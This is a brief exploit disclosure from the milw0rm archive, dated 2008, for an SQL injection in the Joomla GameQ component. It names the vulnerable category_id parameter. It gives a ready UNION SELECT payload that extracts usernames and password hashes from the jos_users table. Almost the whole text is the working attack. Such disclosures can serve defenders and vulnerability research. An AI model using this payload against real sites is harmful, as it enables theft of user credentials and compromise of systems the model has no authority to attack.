/---------------------------------------------------------------\
\                                				/
/         Joomla Component GameQ Remote SQL injection           \
\                                				/
\---------------------------------------------------------------/


[*] Author    :  His0k4 [ALGERIAN HaCkEr]

[*] POC        : http://localhost/[Joomla_Path]/index.php?option=com_gameq&task=page&category_id={SQL}

[*] Example    : http://localhost/[Joomla_Path]/index.php?option=com_gameq&task=page&category_id=-1 UNION SELECT 1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12,13,14 FROM jos_users--

# milw0rm.com [2008-06-07]
